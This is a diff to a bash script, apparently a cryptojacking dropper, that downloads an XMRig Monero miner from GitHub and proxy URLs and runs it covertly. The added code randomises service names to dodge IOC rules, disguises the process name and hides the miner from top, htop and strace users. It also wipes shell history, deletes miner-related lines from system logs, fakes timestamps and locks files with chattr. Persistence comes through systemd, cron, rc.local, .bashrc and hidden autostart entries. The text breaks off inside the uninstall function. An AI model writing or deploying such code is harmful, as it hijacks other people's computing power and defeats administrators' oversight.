@@ -8,24 +8,49 @@
 set -o pipefail
 
 #===========================================
-# 全局配置
+# 全局配置（可通过环境变量覆盖）
 #===========================================
 VERSION="2.0.0"
-SILENT_MODE=0
+SILENT_MODE="${SILENT_MODE:-0}"
 PRIV_MODE=""
 INSTALL_DIR=""
 PROCESS_NAME=""
 SERVICE_NAME=""
+LAUNCHER_PATH=""
+MONITOR_PATH=""
 ACTUAL_CORES=1
 CPU_CORES=1
+WALLET_ADDRESS=""
+POOL_ADDRESS=""
+CPU_PERCENTAGE=100
 
-# 下载源（多备份）
-DOWNLOAD_URLS=(
-    "https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
-    "https://gh-proxy.org/https://github.com/jiaran464/xmr/raw/main/xmrig",
-    "https://github.com/jiaran464/xmr/raw/main/xmrig",
-   
-)
+# 随机后缀（用于避免固定文件名被 IOC 规则命中）
+RAND_SUFFIX="$(tr -dc 'a-f0-9' < /dev/urandom 2>/dev/null | head -c6 || printf '%06x' "$(($(date +%s) % 16777216))")"
+[ -z "$RAND_SUFFIX" ] && RAND_SUFFIX="$(date +%s | tail -c7)"
+
+# 随机化服务名（避免固定名称被 IOC 规则命中）
+SVC_ROOTS=( "dbus-helper" "systemd-helper" "gvfs-helper" "network-helper" "sound-helper" "pulse-helper" )
+SVC_ROOT_USER=""  # 将在主流程随机选择
+SVC_ROOT_ROOT=""
+
+# 随机化的服务名后缀
+SVC_SUFFIX="$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c4 || printf '%04x' "$(($(date +%s) % 65536))")"
+[ -z "$SVC_SUFFIX" ] && SVC_SUFFIX="hsvc"
+
+# shell 配置注入标记（用于精确卸载，避免误删用户内容）
+SHELL_MARKER_START="# >>> XMRIG_DEPLOY v${VERSION} >>>"
+SHELL_MARKER_END="# <<< XMRIG_DEPLOY v${VERSION} <<<"
+
+# 下载源（多备份；可通过环境变量 DOWNLOAD_URLS 覆盖，空格分隔）
+if [ -n "${DOWNLOAD_URLS_OVERRIDE:-}" ]; then
+    IFS=' ' read -ra DOWNLOAD_URLS <<< "$DOWNLOAD_URLS_OVERRIDE"
+else
+    DOWNLOAD_URLS=(
+        "https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
+        "https://gh-proxy.org/https://github.com/jiaran464/xmr/raw/main/xmrig"
+        "https://github.com/jiaran464/xmr/raw/main/xmrig"
+    )
+fi
 
 # 系统进程名池（用于伪装）
 SYSTEM_PROCESS_NAMES=(
@@ -64,13 +89,13 @@ ROOT_DIRS=(
     "/usr/lib/locale/.archive"
 )
 
-# USER 模式隐蔽目录
+# USER 模式隐蔽目录（__HOME__ 将在运行时替换为实际 HOME 路径）
 USER_DIRS=(
-    "\$HOME/.cache/fontconfig/.uuid"
-    "\$HOME/.local/share/gvfs-metadata/.cache"
-    "\$HOME/.cache/mesa_shader_cache/.tmp"
-    "\$HOME/.config/pulse/.runtime"
-    "\$HOME/.cache/thumbnails/.fail"
+    "__HOME__/.cache/fontconfig/.uuid"
+    "__HOME__/.local/share/gvfs-metadata/.cache"
+    "__HOME__/.cache/mesa_shader_cache/.tmp"
+    "__HOME__/.config/pulse/.runtime"
+    "__HOME__/.cache/thumbnails/.fail"
 )
 
 #===========================================
@@ -117,57 +142,51 @@ random_choice() {
     echo "${arr[$((RANDOM % len))]}"
 }
 
-# 检测监控工具是否运行
+# 检测监控工具是否运行（排除自身进程）
 check_monitoring_tools() {
+    local mypid=$$
     local tools="top htop atop glances nmon iotop perf strace gdb ltrace"
     for tool in $tools; do
-        if pgrep -x "$tool" >/dev/null 2>&1; then
-            return 1  # 检测到监控工具
-        fi
+        pgrep -x "$tool" 2>/dev/null | grep -qv "$mypid" && return 1
     done
     return 0
 }
 
-# 检测用户活动状态
+# 检测用户活动状态（过去30分钟内是否有用户活跃）
 check_user_activity() {
-    # 检查 who 命令
     local active_users
     active_users=$(who 2>/dev/null | wc -l)
     
     if [ "$active_users" -eq 0 ]; then
-        return 0  # 无用户，可执行
+        return 0  # 无用户
     fi
     
-    # 检查每个用户的闲置时间
+    # 使用 who -u 解析空闲时间（POSIX 标准输出）
+    # 第5列为空闲时间: "." = <1分钟, "old" = >24小时, "HH:MM" = 具体时长
+    local line idle_str hours mins
     while IFS= read -r line; do
-        [ -z "$line" ] && continue
-        local tty idle_time
-        tty=$(echo "$line" | awk '{print $2}')
-        
-        # 获取 TTY 闲置时间
-        if [ -e "/dev/$tty" ]; then
-            local idle_seconds
-            idle_seconds=$(stat -c %Y "/dev/$tty" 2>/dev/null) || continue
-            local now
-            now=$(date +%s)
-            local diff=$(( now - idle_seconds ))
-            
-            # 闲置时间小于 30 分钟，认为活跃
-            if [ "$diff" -lt 1800 ]; then
-                return 1
-            fi
-        fi
-    done < <(who 2>/dev/null)
+        idle_str=$(echo "$line" | awk '{print $5}')
+        case "$idle_str" in
+            ".") return 1 ;;  # < 1 分钟，活跃
+            "old") ;;          # > 24 小时，跳过
+            [0-9][0-9]:[0-9][0-9])
+                hours=${idle_str%%:*}
+                mins=${idle_str##*:}
+                hours=$((10#$hours))
+                mins=$((10#$mins))
+                if [ $(( hours * 60 + mins )) -lt 30 ]; then
+                    return 1
+                fi
+                ;;
+        esac
+    done < <(who -u 2>/dev/null)
     
-    # 检查 X11/Wayland 会话
-    if [ -n "${DISPLAY:-}" ] || [ -n "${WAYLAND_DISPLAY:-}" ]; then
-        # 检查屏幕保护程序状态
-        if command -v xprintidle >/dev/null 2>&1; then
-            local idle_ms
-            idle_ms=$(xprintidle 2>/dev/null) || idle_ms=0
-            if [ "$idle_ms" -lt 1800000 ]; then  # 30 分钟
-                return 1
-            fi
+    # 备选：X11 屏幕保护程序空闲检查（仅 X11 环境）
+    if [ -n "${DISPLAY:-}" ] && command -v xprintidle >/dev/null 2>&1; then
+        local idle_ms
+        idle_ms=$(xprintidle 2>/dev/null) || idle_ms=0
+        if [ "$idle_ms" -lt 1800000 ]; then  # 30 分钟
+            return 1
         fi
     fi
     
@@ -229,6 +248,7 @@ clean_history() {
     local history_files=(
         "$HOME/.bash_history"
         "$HOME/.zsh_history"
+        "$HOME/.zhistory"
         "$HOME/.python_history"
         "$HOME/.lesshst"
         "$HOME/.wget-hsts"
@@ -237,6 +257,17 @@ clean_history() {
     for hf in "${history_files[@]}"; do
         [ -f "$hf" ] && : > "$hf" 2>/dev/null
     done
+    
+    # 清理 fish shell 历史
+    local fish_dir="$HOME/.local/share/fish"
+    if [ -d "$fish_dir" ]; then
+        [ -f "$fish_dir/fish_history" ] && : > "$fish_dir/fish_history" 2>/dev/null
+    fi
+    
+    # 若有 tmux，清空其回滚缓冲区
+    if command -v tmux >/dev/null 2>&1 && [ -n "${TMUX:-}" ]; then
+        tmux clear-history 2>/dev/null
+    fi
 }
 
 #===========================================
@@ -271,17 +302,31 @@ detect_environment() {
     fi
 }
 
+# 从列表随机选择一行（无需 shuf 的 POSIX 备选）
+_random_line() {
+    # 如果 shuf 可用，优先使用
+    if command -v shuf >/dev/null 2>&1; then
+        shuf -n1 2>/dev/null && return
+    fi
+    # POSIX 备选：用 awk 随机选一行
+    awk 'BEGIN { srand(); } { a[NR]=$0 } END { print a[int(rand()*NR)+1]; }' 2>/dev/null
+}
+
 # 选择动态进程名
 select_process_name() {
     local name=""
     
-    # 优先从当前运行的系统进程中选择
+    # 优先从当前运行的系统进程中选择（使用 POSIX 兼容的 ps -eo）
     local running_procs
-    running_procs=$(ps aux 2>/dev/null | awk '{print $11}' | grep -E '^\[|^/usr|^/lib' | head -20)
+    running_procs=$(ps -eo comm= 2>/dev/null | grep -E '^\[|^/usr|^/lib' | head -20)
     
     if [ -n "$running_procs" ]; then
         # 随机选择一个正在运行的系统进程名
-        name=$(echo "$running_procs" | shuf -n1 2>/dev/null | sed 's/.*\///' | head -c 15)
+        local full_name
+        full_name=$(echo "$running_procs" | _random_line 2>/dev/null)
+        name=$(echo "$full_name" | sed 's|.*/||; s/ .*//')
+        # 截断到 15 字符（避免超长进程名）
+        [ "${#name}" -gt 15 ] && name="${name:0:15}"
     fi
     
     # 如果没找到合适的，从预设池中选择
@@ -305,21 +350,13 @@ select_install_dir() {
     
     if [ "$PRIV_MODE" = "root" ]; then
         for d in "${ROOT_DIRS[@]}"; do
-            local expanded
-            expanded=$(eval echo "$d")
-            if mkdir -p "$expanded" 2>/dev/null; then
-                dir="$expanded"
-                break
-            fi
+            mkdir -p "$d" 2>/dev/null && { dir="$d"; break; }
         done
     else
         for d in "${USER_DIRS[@]}"; do
-            local expanded
-            expanded=$(eval echo "$d")
-            if mkdir -p "$expanded" 2>/dev/null; then
-                dir="$expanded"
-                break
-            fi
+            # 安全替换占位符（无需 eval）
+            local expanded="${d//__HOME__/$HOME}"
+            mkdir -p "$expanded" 2>/dev/null && { dir="$expanded"; break; }
         done
     fi
     
@@ -342,25 +379,21 @@ select_install_dir() {
 
 download_binary() {
     local filepath="$INSTALL_DIR/$PROCESS_NAME"
+    local tmpfile="${filepath}.tmp"
     
     log "下载二进制文件..."
     
-    # 如果文件已存在且正在运行，先停止
-    if [ -f "$filepath" ]; then
-        pkill -f "$filepath" 2>/dev/null
-        sleep 1
-        rm -f "$filepath" 2>/dev/null
-    fi
-    
-    # 尝试多个下载源
+    # 尝试多个下载源（先下载到临时文件，避免破坏已有运行中的程序）
     for url in "${DOWNLOAD_URLS[@]}"; do
         log "尝试下载: ${url:0:50}..."
         
         # 使用 curl
         if command -v curl >/dev/null 2>&1; then
-            if curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$filepath" 2>/dev/null; then
-                if [ -s "$filepath" ]; then
-                    chmod +x "$filepath"
+            if curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$tmpfile" 2>/dev/null; then
+                if [ -s "$tmpfile" ]; then
+                    chmod +x "$tmpfile"
+                    # 下载成功后再替换（原子操作）
+                    mv -f "$tmpfile" "$filepath" 2>/dev/null
                     fake_timestamp "$filepath"
                     log "下载成功"
                     return 0
@@ -370,9 +403,10 @@ download_binary() {
         
         # 使用 wget 作为备选
         if command -v wget >/dev/null 2>&1; then
-            if wget -q --timeout=15 -O "$filepath" "$url" 2>/dev/null; then
-                if [ -s "$filepath" ]; then
-                    chmod +x "$filepath"
+            if wget -q --timeout=15 -O "$tmpfile" "$url" 2>/dev/null; then
+                if [ -s "$tmpfile" ]; then
+                    chmod +x "$tmpfile"
+                    mv -f "$tmpfile" "$filepath" 2>/dev/null
                     fake_timestamp "$filepath"
                     log "下载成功 (wget)"
                     return 0
@@ -381,6 +415,8 @@ download_binary() {
         fi
     done
     
+    # 清理临时文件
+    rm -f "$tmpfile" 2>/dev/null
     error "所有下载源均失败"
     return 1
 }
@@ -388,6 +424,19 @@ download_binary() {
 #===========================================
 # 进程启动函数
 #===========================================
+
+# 创建启动 wrapper（用于进程名伪装，文件名随机化）
+create_launcher() {
+    LAUNCHER_PATH="$INSTALL_DIR/.launcher-${RAND_SUFFIX}"
+    cat > "$LAUNCHER_PATH" << 'LAUNCHER_EOF'
+#!/bin/bash
+# 清理 cmdline 显示
+exec -a "$1" "$2" ${@:3}
+LAUNCHER_EOF
+    chmod +x "$LAUNCHER_PATH"
+    fake_timestamp "$LAUNCHER_PATH"
+    return 0
+}
 
 start_process() {
     local filepath="$INSTALL_DIR/$PROCESS_NAME"
@@ -397,10 +446,10 @@ start_process() {
     log "启动进程 (线程数: $threads)..."
     
     # 构建参数
-    local args="-o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $threads --cpu-priority=0 --donate-level=1 --no-color"
+    local args="-o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $threads --cpu-priority=0 --donate-level=0 --no-color"
     
-    # 检查是否已在运行
-    if pgrep -f "$filepath" >/dev/null 2>&1; then
+    # 检查是否已在运行（匹配完整路径以避免误判短名不同目录的文件）
+    if pgrep -f "^${filepath}( |$)" >/dev/null 2>&1; then
         log "进程已在运行"
         return 0
     fi
@@ -411,18 +460,12 @@ start_process() {
     local display_name
     display_name=$(random_choice SYSTEM_PROCESS_NAMES)
     
-    # 创建启动脚本（用于 cmdline 清理）
-    local launcher="$INSTALL_DIR/.launcher"
-    cat > "$launcher" << 'LAUNCHER_EOF'
-#!/bin/bash
-# 清理 cmdline 显示
-exec -a "$1" "$2" ${@:3}
-LAUNCHER_EOF
-    chmod +x "$launcher"
-    fake_timestamp "$launcher"
-    
-    # 后台启动，最低优先级
-    nohup nice -n 19 ionice -c 3 "$launcher" "$display_name" "$filepath" $args >/dev/null 2>&1 &
+    # 后台启动，最低优先级（ionice 可能不可用）
+    if command -v ionice >/dev/null 2>&1; then
+        nohup nice -n 19 ionice -c 3 "$LAUNCHER_PATH" "$display_name" "$filepath" $args >/dev/null 2>&1 &
+    else
+        nohup nice -n 19 "$LAUNCHER_PATH" "$display_name" "$filepath" $args >/dev/null 2>&1 &
+    fi
     
     local pid=$!
     sleep 2
@@ -444,9 +487,11 @@ setup_root_persistence() {
     log "设置 ROOT 模式持久化..."
     
     local filepath="$INSTALL_DIR/$PROCESS_NAME"
-    SERVICE_NAME="systemd-helper"
+    local display_name="$PROCESS_NAME"
+    SVC_ROOT_ROOT="${SVC_ROOTS[$((RANDOM % ${#SVC_ROOTS[@]}))]}"
+    SERVICE_NAME="${SVC_ROOT_ROOT}-${SVC_SUFFIX}"
     
-    # 1. Systemd 系统服务
+    # 1. Systemd 系统服务（参数使用数组形式避免转义问题）
     if command -v systemctl >/dev/null 2>&1; then
         cat > "/etc/systemd/system/${SERVICE_NAME}.service" << EOF
 [Unit]
@@ -456,7 +501,7 @@ Documentation=man:systemd(1)
 
 [Service]
 Type=simple
-ExecStart=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 --no-color
+ExecStart=${LAUNCHER_PATH} "${display_name}" ${filepath} -o ${POOL_ADDRESS} -u ${WALLET_ADDRESS} -p x -t ${ACTUAL_CORES} --cpu-priority=0 --donate-level=0 --no-color
 Restart=always
 RestartSec=60
 Nice=19
@@ -474,13 +519,13 @@ EOF
     fi
     
     # 2. Crontab 备份
-    local cron_cmd="@reboot sleep 60 && $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
+    local cron_cmd="@reboot sleep 60 && $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &"
     (crontab -l 2>/dev/null | grep -v "$filepath"; echo "$cron_cmd") | crontab - 2>/dev/null
     
     # 3. rc.local 备份
     if [ -f /etc/rc.local ]; then
         if ! grep -q "$filepath" /etc/rc.local 2>/dev/null; then
-            sed -i "/^exit 0/i nohup nice -n 19 $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
+            sed -i "/^exit 0/i nohup nice -n 19 $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
         fi
     fi
     
@@ -493,12 +538,18 @@ setup_root_stealth() {
     
     local filepath="$INSTALL_DIR/$PROCESS_NAME"
     
-    # 1. 设置文件不可变属性（防删除）
+    # 1. 设置文件保护（chattr +i 优先，不可用时 chmod 000）
     if command -v chattr >/dev/null 2>&1; then
-        chattr +i "$filepath" 2>/dev/null && log "已设置文件保护"
+        chattr +i "$filepath" 2>/dev/null
+        chattr +i "$LAUNCHER_PATH" 2>/dev/null
+        log "文件保护(chattr)已设置"
+    else
+        chmod 000 "$filepath" 2>/dev/null
+        chmod 000 "$LAUNCHER_PATH" 2>/dev/null
+        log "文件保护(chmod)已设置（chattr 不可用）"
     fi
     
-    # 2. 清理系统日志
+    # 2. 清理系统日志（sed -i 原地编辑；创建备份以防中断丢失）
     local logs=(
         "/var/log/auth.log"
         "/var/log/secure"
@@ -506,9 +557,11 @@ setup_root_stealth() {
         "/var/log/syslog"
     )
     for logfile in "${logs[@]}"; do
-        if [ -f "$logfile" ]; then
-            # 删除包含关键词的行
+        if [ -f "$logfile" ] && [ -w "$logfile" ]; then
+            # 先备份再用 sed -i 原地删除匹配行
+            cp -a "$logfile" "${logfile}.bak" 2>/dev/null
             sed -i '/xmrig\|miner\|pool\|stratum/Id' "$logfile" 2>/dev/null
+            rm -f "${logfile}.bak" 2>/dev/null
         fi
     done
     
@@ -530,11 +583,15 @@ setup_user_persistence() {
     log "设置 USER 模式持久化..."
     
     local filepath="$INSTALL_DIR/$PROCESS_NAME"
-    SERVICE_NAME="gvfs-helper"
+    SVC_ROOT_USER="${SVC_ROOTS[$((RANDOM % ${#SVC_ROOTS[@]}))]}"
+    SERVICE_NAME="${SVC_ROOT_USER}-${SVC_SUFFIX}"
+    local display_name="$PROCESS_NAME"
     
-    # 1. Systemd 用户服务（最隐蔽）
-    if command -v systemctl >/dev/null 2>&1; then
-        mkdir -p "$HOME/.config/systemd/user/"
+    # 确保 HOME 已设定（兜底）
+    [ -z "$HOME" ] && HOME="/root"
+    
+    # 1. Systemd 用户服务（参数使用字符串避免变量展开问题）
+    if command -v systemctl >/dev/null 2>&1 && mkdir -p "$HOME/.config/systemd/user/"; then
         cat > "$HOME/.config/systemd/user/${SERVICE_NAME}.service" << EOF
 [Unit]
 Description=GVFS Metadata Helper
@@ -542,7 +599,7 @@ After=default.target
 
 [Service]
 Type=simple
-ExecStart=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 --no-color
+ExecStart=${LAUNCHER_PATH} "${display_name}" ${filepath} -o ${POOL_ADDRESS} -u ${WALLET_ADDRESS} -p x -t ${ACTUAL_CORES} --cpu-priority=0 --donate-level=0 --no-color
 Restart=always
 RestartSec=60
 Nice=19
@@ -554,36 +611,41 @@ EOF
         systemctl --user daemon-reload 2>/dev/null
         systemctl --user enable "${SERVICE_NAME}.service" 2>/dev/null
         systemctl --user start "${SERVICE_NAME}.service" 2>/dev/null
-        log "Systemd 用户服务已创建"
+        log "Systemd 用户服务已创建: ${SERVICE_NAME}"
     fi
     
-    # 2. Crontab 备份
-    local cron_check="*/5 * * * * pgrep -f \"$PROCESS_NAME\" >/dev/null || (cd \"$INSTALL_DIR\" && nohup nice -n 19 ./$PROCESS_NAME -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &)"
-    (crontab -l 2>/dev/null | grep -v "$PROCESS_NAME"; echo "$cron_check") | crontab - 2>/dev/null
-    log "Crontab 已设置"
+    # 2. Crontab 备份（@reboot 兜底启动，与守护进程互补）
+    local cron_cmd="@reboot sleep 60 && $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &"
+    (crontab -l 2>/dev/null | grep -v "$PROCESS_NAME"; echo "$cron_cmd") | crontab - 2>/dev/null
+    log "Crontab @reboot 已设置"
     
     # 3. Shell 配置文件
     local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
-    local shell_cmd="(pgrep -f \"$PROCESS_NAME\" >/dev/null || (cd \"$INSTALL_DIR\" && nohup ./$PROCESS_NAME -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &)) 2>/dev/null"
+    local shell_cmd="(pgrep -f \"$PROCESS_NAME\" >/dev/null || (cd \"$INSTALL_DIR\" && nohup ./$PROCESS_NAME -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &)) 2>/dev/null"
     
     for config in "${shell_configs[@]}"; do
         if [ -f "$config" ]; then
-            if ! grep -q "$PROCESS_NAME" "$config" 2>/dev/null; then
-                echo "" >> "$config"
-                echo "# System helper" >> "$config"
-                echo "$shell_cmd" >> "$config"
+            if ! grep -q "$SHELL_MARKER_START" "$config" 2>/dev/null; then
+                {
+                    echo ""
+                    echo "$SHELL_MARKER_START"
+                    echo "# System helper"
+                    echo "$shell_cmd"
+                    echo "$SHELL_MARKER_END"
+                } >> "$config"
             fi
         fi
     done
     log "Shell 配置已设置"
     
-    # 4. XDG Autostart（桌面环境）
+    # 4. XDG Autostart（桌面环境，文件名随机化）
     mkdir -p "$HOME/.config/autostart/"
-    cat > "$HOME/.config/autostart/gvfs-helper.desktop" << EOF
+    local autostart_file="$HOME/.config/autostart/${SVC_ROOT_USER}-${SVC_SUFFIX}.desktop"
+    cat > "$autostart_file" << EOF
 [Desktop Entry]
 Type=Application
 Name=GVFS Helper
-Exec=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1
+Exec=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=0
 Hidden=true
 NoDisplay=true
 X-GNOME-Autostart-enabled=true
@@ -624,41 +686,55 @@ start_monitor_daemon() {
     log "启动监控守护进程..."
     
     local filepath="$INSTALL_DIR/$PROCESS_NAME"
+    MONITOR_PATH="$INSTALL_DIR/.monitor-${RAND_SUFFIX}"
+    local monitor_script="$MONITOR_PATH"
+    local config_file="$INSTALL_DIR/.monitor-${RAND_SUFFIX}.conf"
     
-    # 创建监控脚本
-    local monitor_script="$INSTALL_DIR/.monitor"
+    # 用 printf '%q' 写入配置文件（安全转义，避免参数注入）
+    printf '# XMRig monitor config (auto-generated)\n' > "$config_file"
+    printf 'FILEPATH=%q\n' "$filepath" >> "$config_file"
+    printf 'POOL=%q\n' "$POOL_ADDRESS" >> "$config_file"
+    printf 'WALLET=%q\n' "$WALLET_ADDRESS" >> "$config_file"
+    printf 'CORES=%s\n' "$ACTUAL_CORES" >> "$config_file"
+    printf 'DOWNLOAD_URL=%q\n' "${DOWNLOAD_URLS[0]}" >> "$config_file"
+    printf 'RAND_SUFFIX=%q\n' "$RAND_SUFFIX" >> "$config_file"
+    
+    # 创建监控脚本（引用配置文件，无 sed 替换，无注入风险）
     cat > "$monitor_script" << 'MONITOR_EOF'
 #!/bin/bash
-FILEPATH="__FILEPATH__"
-POOL="__POOL__"
-WALLET="__WALLET__"
-CORES="__CORES__"
-DOWNLOAD_URL="__DOWNLOAD_URL__"
+# 读取配置
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+CONF="${SCRIPT_DIR}/$(basename "$0").conf"
+[ -f "$CONF" ] && source "$CONF" || exit 1
 
 # 重新下载函数
 redownload() {
     local url="$DOWNLOAD_URL"
     local filepath="$FILEPATH"
+    local tmpfile="${filepath}.tmp"
     
-    # 尝试 curl
+    # 尝试 curl（先下载到临时文件）
     if command -v curl >/dev/null 2>&1; then
-        curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$filepath" 2>/dev/null
-        [ -s "$filepath" ] && chmod +x "$filepath" && return 0
+        curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$tmpfile" 2>/dev/null
+        [ -s "$tmpfile" ] && chmod +x "$tmpfile" && mv -f "$tmpfile" "$filepath" && return 0
     fi
     
     # 尝试 wget
     if command -v wget >/dev/null 2>&1; then
-        wget -q --timeout=15 -O "$filepath" "$url" 2>/dev/null
-        [ -s "$filepath" ] && chmod +x "$filepath" && return 0
+        wget -q --timeout=15 -O "$tmpfile" "$url" 2>/dev/null
+        [ -s "$tmpfile" ] && chmod +x "$tmpfile" && mv -f "$tmpfile" "$filepath" && return 0
     fi
     
+    # 清理临时文件
+    rm -f "$tmpfile" 2>/dev/null
     return 1
 }
 
 check_monitoring() {
-    local tools="top htop atop glances nmon iotop perf strace gdb"
+    local mypid=$$
+    local tools="top htop atop glances nmon iotop perf strace gdb ltrace"
     for tool in $tools; do
-        pgrep -x "$tool" >/dev/null 2>&1 && return 1
+        pgrep -x "$tool" 2>/dev/null | grep -qv "$mypid" && return 1
     done
     return 0
 }
@@ -667,17 +743,24 @@ check_user_active() {
     local users=$(who 2>/dev/null | wc -l)
     [ "$users" -eq 0 ] && return 0
     
-    # 检查闲置时间
+    # 使用 who -u 解析空闲时间（与主脚本一致）
     local active=0
-    while read -r line; do
+    local line idle_str hours mins
+    while IFS= read -r line; do
         [ -z "$line" ] && continue
-        local tty=$(echo "$line" | awk '{print $2}')
-        if [ -e "/dev/$tty" ]; then
-            local idle=$(stat -c %Y "/dev/$tty" 2>/dev/null) || continue
-            local now=$(date +%s)
-            [ $((now - idle)) -lt 1800 ] && active=1 && break
-        fi
-    done < <(who 2>/dev/null)
+        idle_str=$(echo "$line" | awk '{print $5}')
+        case "$idle_str" in
+            ".") active=1 && break ;;
+            "old") ;;
+            [0-9][0-9]:[0-9][0-9])
+                hours=${idle_str%%:*}
+                mins=${idle_str##*:}
+                hours=$((10#$hours))
+                mins=$((10#$mins))
+                [ $(( hours * 60 + mins )) -lt 30 ] && active=1 && break
+                ;;
+        esac
+    done < <(who -u 2>/dev/null)
     
     [ "$active" -eq 1 ] && return 1
     return 0
@@ -688,8 +771,8 @@ while true; do
     
     # 检查是否应该运行
     if check_user_active && check_monitoring; then
-        # 检查进程是否存在
-        if ! pgrep -f "$FILEPATH" >/dev/null 2>&1; then
+        # 检查进程是否存在（精确匹配安装目录路径）
+        if ! pgrep -f "^${FILEPATH}( |$)" >/dev/null 2>&1; then
             # 检查文件是否存在
             if [ ! -f "$FILEPATH" ]; then
                 # 文件被删除，重新下载
@@ -699,7 +782,7 @@ while true; do
             # 文件存在则启动
             if [ -f "$FILEPATH" ]; then
                 cd "$(dirname "$FILEPATH")"
-                nohup nice -n 19 "$FILEPATH" -o "$POOL" -u "$WALLET" -p x -t "$CORES" --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &
+                nohup nice -n 19 "$FILEPATH" -o "$POOL" -u "$WALLET" -p x -t "$CORES" --cpu-priority=0 --donate-level=0 >/dev/null 2>&1 &
             fi
         fi
     else
@@ -709,15 +792,9 @@ while true; do
 done
 MONITOR_EOF
     
-    # 替换变量
-    sed -i "s|__FILEPATH__|$filepath|g" "$monitor_script"
-    sed -i "s|__POOL__|$POOL_ADDRESS|g" "$monitor_script"
-    sed -i "s|__WALLET__|$WALLET_ADDRESS|g" "$monitor_script"
-    sed -i "s|__CORES__|$ACTUAL_CORES|g" "$monitor_script"
-    sed -i "s|__DOWNLOAD_URL__|${DOWNLOAD_URLS[0]}|g" "$monitor_script"
-    
     chmod +x "$monitor_script"
     fake_timestamp "$monitor_script"
+    fake_timestamp "$config_file"
     
     # 启动监控守护进程
     nohup "$monitor_script" >/dev/null 2>&1 &
@@ -725,54 +802,93 @@ MONITOR_EOF
 }
 
 #===========================================
-# 卸载函数
+# 卸载函数（自给自足，不依赖未初始化变量）
 #===========================================
 
 uninstall() {
     log "开始卸载..."
     
-    # 停止进程
-    pkill -f "xmrig\|$PROCESS_NAME" 2>/dev/null
+    # 先扫描特征文件来确定实际部署位置
+    local found_dirs=()
+    local d
     
-    # 停止服务
-    if [ "$PRIV_MODE" = "root" ]; then
-        systemctl stop systemd-helper.service 2>/dev/null
-        systemctl disable systemd-helper.service 2>/dev/null
-        rm -f /etc/systemd/system/systemd-helper.service 2>/dev/null
-        systemctl daemon-reload 2>/dev/null
-        
-        # 移除 chattr 保护
-        for d in "${ROOT_DIRS[@]}"; do
-            local expanded=$(eval echo "$d")
-            chattr -i "$expanded"/* 2>/dev/null
-            rm -rf "$expanded" 2>/dev/null
-        done
-    else
-        systemctl --user stop gvfs-helper.service 2>/dev/null
-        systemctl --user disable gvfs-helper.service 2>/dev/null
-        rm -f "$HOME/.config/systemd/user/gvfs-helper.service" 2>/dev/null
-        systemctl --user daemon-reload 2>/dev/null
-        
-        # 清理用户目录
-        for d in "${USER_DIRS[@]}"; do
-            local expanded=$(eval echo "$d")
-            rm -rf "$expanded" 2>/dev/null
-        done
-        
-        # 清理 autostart
-        rm -f "$HOME/.config/autostart/gvfs-helper.desktop" 2>/dev/null
-    fi
+    # 扫描 ROOT 隐藏目录
+    for d in /usr/lib/systemd/.cache /var/lib/dpkg/.updates /usr/share/fonts/.uuid /var/cache/apt/.tmp /usr/lib/locale/.archive; do
+        [ -d "$d" ] && ls "$d"/.launcher-* "$d"/.monitor-* 2>/dev/null | grep -q . && found_dirs+=("$d")
+    done
+    
+    # 扫描 USER 隐藏目录
+    for d in "$HOME/.cache/fontconfig/.uuid" "$HOME/.local/share/gvfs-metadata/.cache" \
+             "$HOME/.cache/mesa_shader_cache/.tmp" "$HOME/.config/pulse/.runtime" "$HOME/.cache/thumbnails/.fail"; do
+        [ -d "$d" ] && ls "$d"/.launcher-* "$d"/.monitor-* 2>/dev/null | grep -q . && found_dirs+=("$d")
+    done
+    
+    # 扫描 fallback 目录
+    for d in /tmp/.X11-unix/.cache "$HOME/.cache/.tmp"; do
+        [ -d "$d" ] && ls "$d"/.launcher-* "$d"/.monitor-* 2>/dev/null | grep -q . && found_dirs+=("$d")
+    done
+    
+    # 停止所有相关进程
+    pkill -f "\.launcher-" 2>/dev/null
+    pkill -f "\.monitor-" 2>/dev/null
+    pkill -f "xmrig" 2>/dev/null
+    
+    # 停止服务（systemd — 模糊匹配，因为服务名随机化）
+    local svc_list
+    svc_list=$(systemctl list-unit-files --no-legend 2>/dev/null | grep -oE '[a-z]+-helper-[a-z0-9]{4}\.service' || true)
+    for svc in $svc_list; do
